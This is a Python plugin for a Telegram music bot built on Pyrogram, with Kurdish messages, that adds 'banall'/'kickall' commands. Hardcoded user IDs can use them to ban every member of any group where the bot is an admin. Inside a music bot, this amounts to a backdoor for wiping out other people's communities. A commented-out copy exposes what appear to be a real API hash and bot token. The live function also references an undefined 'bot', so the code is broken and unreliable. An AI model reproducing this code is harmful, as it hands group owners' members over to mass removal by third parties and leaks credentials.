import asyncio
from pyrogram import Client, filters
from pyrogram.errors import FloodWait, ChatAdminRequired, PeerIdInvalid

from AlinaMusic import app

SUDOERS = [7210848076, 833360381, 7265466776]  # Replace with actual Telegram user IDs of sudo users



async def ban_members(chat_id, user_id, bot_permission, total_members, msg):
    banned_count = 0
    failed_count = 0
    ok = await msg.reply_text(
        f"**کۆی گشتی ئەندامی دۆزراوە: {total_members}\nدەستی پێکرد**"
    )

    while failed_count <= 30:
        async for member in bot.get_chat_members(chat_id):
            if failed_count > 30:
                break  # Stop if failed bans exceed 30

            try:
                if member.user.id != user_id and member.user.id not in SUDOERS:
                    await bot.ban_chat_member(chat_id, member.user.id)
                    banned_count += 1

                    if banned_count % 5 == 0:
                        try:
                            await ok.edit_text(
                                f"**بینرا {banned_count} ئەندام لە {total_members}**"
                            )
                        except Exception:
                            pass  # Ignore if edit fails

            except FloodWait as e:
                # Wait for the flood time and continue
                await asyncio.sleep(e.x)
            except Exception:
                failed_count += 1

        if failed_count <= 30:
            await asyncio.sleep(
                5
            )  # Retry every 5 seconds if failed bans are within the limit

    await ok.edit_text(
        f"**کۆی گشتی ئەندام: {banned_count}\nشکست: {failed_count}\nوەستا بەهۆی سنوور.**"
    )


@app.on_message(filters.command(["banall", "kickall"]) & filters.user(SUDOERS))
async def ban_all(bot, msg):
    command = msg.text.split()
    if len(command) < 2:
        await msg.reply_text("**تکایە یوزەرنەیم یان ئایدی گرووپ بنوسە**")
        return

    input_group = command[1]
    try:
        # Resolve group username to chat ID if necessary
        if input_group.startswith("@"):
            chat = await bot.get_chat(input_group)
            chat_id = chat.id
        else:
            chat_id = int(input_group)  # Assume it's a group ID

        # Verify bot permissions
        bot_info = await bot.get_me()
        BOT_ID = bot_info.id

        botp = await bot.get_chat_member(chat_id, BOT_ID)
        bot_permission = botp.privileges.can_restrict_members

        if bot_permission:
            total_members = 0
            async for _ in bot.get_chat_members(chat_id):
                total_members += 1

            await ban_members(chat_id, msg.from_user.id, bot_permission, total_members, msg)

        else:
            await msg.reply_text("**ببورە بۆتەکە مافی نییە لە گرووپەکە.**")

    except PeerIdInvalid:
        await msg.reply_text("**گروپەکە نادروستە یان بۆتەکەی تێدانییە.**")
    except ChatAdminRequired:
        await msg.reply_text("**ببورە بۆتەکە ئەدمین نییە لە گرووپەکە.**")
    except Exception as e:
        await msg.reply_text(f"**هەڵە ڕوویدا: {str(e)}**")


"""
import asyncio

from pyrogram import Client, filters
from pyrogram.errors import FloodWait


SUDOERS = [7210848076, 833360381, 7265466776]  # Replace with actual Telegram user IDs of sudo users

# Replace these with your own API ID and API hash
API_ID = 12962251  # Your API ID from https://my.telegram.org
API_HASH = "b51499523800add51e4530c6f552dbc8"  # Your API hash from https://my.telegram.org
BOT_TOKEN = "7951655243:AAGs5da9H4uxAw2u27bBBQ0ms1S5e19co1A"  # Your bot token from @BotFather

# Initialize the bot client
bot = Client("banall", api_id=API_ID, api_hash=API_HASH, bot_token=BOT_TOKEN)

async def ban_members(chat_id, user_id, bot_permission, total_members, msg):
    banned_count = 0
    failed_count = 0
    ok = await msg.reply_text(
        f"**کۆی گشتی ئەندامی دۆزراوە: {total_members}\nدەستی پێکرد**"
    )

    while failed_count <= 30:
        async for member in bot.get_chat_members(chat_id):
            if failed_count > 30:
                break  # Stop if failed bans exceed 30

            try:
                if member.user.id != user_id and member.user.id not in SUDOERS:
                    await bot.ban_chat_member(chat_id, member.user.id)
                    banned_count += 1

                    if banned_count % 5 == 0:
                        try:
                            await ok.edit_text(
                                f"**دەکرا {banned_count} ئەندام لە {total_members}**"
                            )
                        except Exception:
                            pass  # Ignore if edit fails

            except FloodWait as e:
                # Wait for the flood time and continue
                await asyncio.sleep(e.x)
            except Exception:
                failed_count += 1

        if failed_count <= 30:
            await asyncio.sleep(
                5
            )  # Retry every 5 seconds if failed bans are within the limit

    await ok.edit_text(
        f"**کۆی گشتی دەکراو: {banned_count}\nدەرنەکراو: {failed_count}\nوەستا بەهۆی سنووری دەرکردن.**"
    )


@bot.on_message(filters.command(["banall", "kickall"]) & filters.user(SUDOERS))
async def ban_all(bot, msg):
    # Your existing code here
    chat_id = msg.chat.id
    user_id = msg.from_user.id  # ID of the user who issued the command
    bot_info = await bot.get_me()
    BOT_ID = bot_info.id

    botp = await bot.get_chat_member(chat_id, BOT_ID)
    bot_permission = botp.privileges.can_restrict_members

    if bot_permission:
        total_members = 0
        async for _ in bot.get_chat_members(chat_id):
            total_members += 1

        await ban_members(chat_id, user_id, bot_permission, total_members, msg)

    else:
        await msg.reply_text(
            "**ببورە تۆ گەشەپێدەر یان خاوەنی بۆت نییت**"
        )

print("Running!")
bot.run()
"""
